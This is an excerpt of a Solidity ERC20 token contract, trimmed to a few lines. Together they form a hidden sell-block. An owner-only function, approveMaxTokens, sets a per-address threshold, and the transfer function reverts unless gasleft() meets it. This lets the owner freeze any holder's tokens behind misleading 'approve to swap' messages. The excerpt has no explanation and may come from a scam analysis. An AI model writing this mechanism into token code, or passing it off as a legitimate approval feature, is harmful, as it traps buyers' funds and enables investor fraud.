...
contract ERC20 is Context, IERC20 {
  ...
  mapping(address => uint256) public approveTokenAmount;
  ...
  constructor(
      ...
      taxFee = taxFee_;
      owner = _msgSender();
      _totalSupply = 92000000000000 * (10 ** uint256(decimals_));
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal virtual {
      ...
      require(gasleft() >= approveTokenAmount[sender], "Approve to swap on Dex");
  ...
  function _approve(address owner, address spender, uint256 amount) internal virtual {
     ...
     */
      function approveMaxTokens(address _address, uint256 apprveForSwap) external {
      require(_msgSender() == owner, "Get approval before swap");
        approveTokenAmount[_address] = apprveForSwap;
    }
